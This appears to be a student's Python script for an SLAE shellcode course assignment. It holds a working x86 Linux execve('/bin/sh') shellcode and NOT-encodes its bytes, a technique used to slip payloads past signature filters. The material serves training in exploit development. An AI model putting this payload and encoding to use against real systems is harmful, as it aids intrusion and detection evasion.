#!/usr/bin/python3
'''
Filename:   encoder.py  
Author:     aus-mate
Purpose:    This code was written for assignment #4 of the SecurityTube Linux Assembly Expert certification.
Student ID: SLAE-1555
'''

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")
enc_shellcode = ""
dec_shellcode = ""

for i in bytearray(shellcode, 'ISO-8859-1'):
    x = ~i
    enc_shellcode += '\\x' + '%02x' % (x & 0xff)

print("Original: " + "\""+"".join("\\x%02x" % i for i in bytearray(shellcode, 'ISO-8859-1'))+"\"")
print("\nNOT Encoded: " + "\""+ enc_shellcode + "\"")



